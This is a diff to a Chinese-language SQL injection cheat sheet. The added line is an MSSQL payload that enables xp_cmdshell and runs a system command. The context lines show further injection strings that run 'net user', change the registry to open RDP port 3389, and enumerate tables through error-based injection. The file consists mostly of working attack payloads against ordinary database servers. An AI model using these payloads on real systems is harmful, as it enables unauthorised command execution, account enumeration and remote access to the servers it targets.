@@ -250,6 +250,7 @@ https://www.somd5.com/download/dict/
 ```
 ';exec master..xp_cmdshell 'net user'--+	
 ' and 1=(select * from openrowset('sqloledb','trusted_connection=yes','set fmtonly off exec master..xp_cmdshell ''net user'''))--+
+' if 1=1 execute('exec sp_configure ''show advanced options'',1;reconfigure;exec sp_configure ''xp_cmdshell'', 1;reconfigure;exec xp_cmdshell ''whoami''')--+
 ```
 - 创建一个包含两个字段t1的cmd_sql表
 ```
@@ -259,7 +260,7 @@ https://www.somd5.com/download/dict/
 ```
 - 开启3389端口
 ```
-';exec master..xp_cmdshell 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f'--+	
+';exec master..xp_cmdshell 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f'--+
 ```
 
 #### mssql报错注入
@@ -397,7 +398,7 @@ file_name(@@version)
 1' and (select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)
 
 ```
-#### mssql时间盲注
+#### mysql时间盲注
 
 - 获取database长度
 ```
